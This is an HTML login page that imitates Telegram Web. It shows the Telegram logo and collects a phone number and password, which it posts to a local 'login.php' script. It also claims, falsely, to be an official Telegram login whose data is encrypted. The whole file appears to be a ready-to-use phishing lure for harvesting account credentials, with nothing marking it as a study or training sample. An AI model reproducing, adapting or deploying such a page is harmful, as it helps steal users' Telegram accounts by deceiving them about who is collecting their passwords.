<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f4c75 0%, #2a3b4c 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            width: 380px;
            padding: 40px 35px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
        }
        .telegram-logo {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            color: #1c1e21;
            margin-bottom: 10px;
        }
        .sub {
            color: #65676b;
            font-size: 14px;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            border-color: #27a6e5;
        }
        button {
            width: 100%;
            background: #27a6e5;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #1e8bc9; }
        .note {
            margin-top: 20px;
            font-size: 12px;
            color: #65676b;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img class="telegram-logo" src="https://telegram.org/img/t_logo.svg" alt="Telegram">
        <h2>Sign in to Telegram</h2>
        <div class="sub">Please enter your phone number and password</div>
        <form method="POST" action="login.php">
            <input type="text" name="phone" placeholder="Phone number (e.g., +628123456789)" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="note">⚠️ This is an official Telegram web login. Your data is encrypted.</div>
    </div>
</body>
</html>
